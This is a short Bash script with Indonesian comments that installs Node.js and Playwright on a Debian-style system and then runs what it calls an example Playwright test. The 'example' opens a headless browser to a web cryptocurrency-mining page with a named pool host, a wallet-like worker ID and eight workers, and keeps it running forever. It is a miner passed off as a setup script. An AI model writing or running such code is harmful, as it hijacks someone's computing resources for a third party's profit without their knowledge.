#!/usr/bin/env bash
set -e

echo "[*] Update sistem..."
sudo apt-get update -y
sudo apt-get upgrade -y

echo "[*] Install dependency dasar..."
sudo apt-get install -y wget curl unzip git \
  libatk1.0-0t64 \
  libatk-bridge2.0-0t64 \
  libcups2t64 \
  libxkbcommon0 \
  libatspi2.0-0t64 \
  libxdamage1 \
  libxcomposite1 \
  libxrandr2 \
  libgbm1 \
  libgtk-3-0t64 \
  libpango-1.0-0 \
  libasound2t64 \
  libnss3 \
  libxshmfence1 \
  libdrm2 \
  libxcb1 \
  libx11-xcb1

echo "[*] Install Node.js (LTS 20.x) + npm..."
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

echo "[*] Cek versi Node & npm..."
node -v
npm -v

echo "[*] Install Playwright..."
npm install -g playwright
npm init -y          # kalau belum ada package.json
npm install playwright

echo "[*] Download browser Playwright..."
npx playwright install --with-deps

echo "[*] Buat script contoh Playwright..."
cat > test-playwright.js <<'EOF'
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();
  await page.goto('https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.cs&password=x&workers=8');
  console.log("🌐 Browser masih jalan (tidak ditutup). Tekan CTRL+C untuk menghentikan script.");
  
  // Jangan close browser, biarkan process tetap hidup
  await new Promise(() => {});  // block forever
})();
EOF

echo "[*] Jalankan contoh script headless..."
node test-playwright.js
